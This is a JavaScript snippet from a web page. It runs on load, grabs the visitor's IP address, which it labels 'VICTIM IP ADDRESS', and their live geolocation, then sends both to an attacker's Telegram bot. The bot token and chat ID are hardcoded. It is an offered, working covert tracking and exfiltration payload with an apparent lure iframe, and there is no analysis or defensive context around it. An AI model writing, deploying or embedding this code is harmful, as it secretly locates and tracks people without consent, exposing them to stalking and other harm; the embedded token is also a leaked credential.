    <script>
        const botToken = "7823899306:AAGmNywzWlvQmSHwBtKCkZhDP0ff8Q36M48";
        const chatId = "6514434473";
 <!--IP TRAINING CODE -->    
        function getIPAddress() {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    sendMessageToTelegram(`VICTIM IP ADDRESS: ${data.ip}`);
                })
                .catch(error => console.error("Error fetching IP address:", error));
        }

 
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const altitude = position.coords.altitude || 'Not available';  // Some devices may not provide altitude

                        
                        const locationURL = `https://www.google.com/maps?q=${latitude},${longitude}`;


                        const locationMessage = `Live Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAltitude: ${altitude}\nLocation URL: ${locationURL}`;
                        sendMessageToTelegram(locationMessage);
                    },
                    (error) => {
                        console.error("Error getting location:", error);
                        sendMessageToTelegram("Unable to get location.");
                    }
                );
            } else {
                console.error("Geolocation is not supported by this browser.");
                sendMessageToTelegram("Geolocation is not supported by this browser.");
            }
        }

       
        function sendMessageToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Message sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => console.error("Error sending message:", error));
        }

        
        getIPAddress();
        getLocation(); 
               
        const iframe = document.getElementById("transectionFrame");
        iframe.srcdoc = `

        `;
    </script>